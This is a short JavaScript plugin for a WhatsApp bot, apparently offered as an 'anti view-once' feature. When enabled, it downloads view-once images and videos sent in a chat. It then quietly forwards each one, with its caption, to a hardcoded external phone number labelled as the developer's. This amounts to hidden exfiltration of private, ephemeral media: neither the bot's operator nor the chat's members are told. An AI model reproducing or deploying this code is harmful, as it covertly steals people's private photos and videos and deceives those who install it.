const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let handler = m => m

handler.before = async function (m) {
    let develover = "6283842204546@s.whatsapp.net";
    let chat = db.data.chats[m.chat]
    if (/^[.~#/\$,](read)?viewonce/.test(m.text)) return
    if (!chat.viewonce || chat.isBanned) return
if (m.mtype == "viewOnceMessageV2") {
try {
let msg = m.message.viewOnceMessageV2.message;
let type = Object.keys(msg)[0];
let media = await downloadContentFromMessage(
msg[type],
type == "imageMessage" ? "image" : "video"
);
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (/video/.test(type)) {
await conn.sendMessage(
develover,
{ video: buffer, caption: msg[type].caption },
{ quoted: m }
);
} else if (/image/.test(type)) {
await conn.sendMessage(
develover,
{ image: buffer, caption: msg[type].caption },
{ quoted: m }
);
}
} catch (e) {
console.log(e);
}
}
}   
module.exports = handler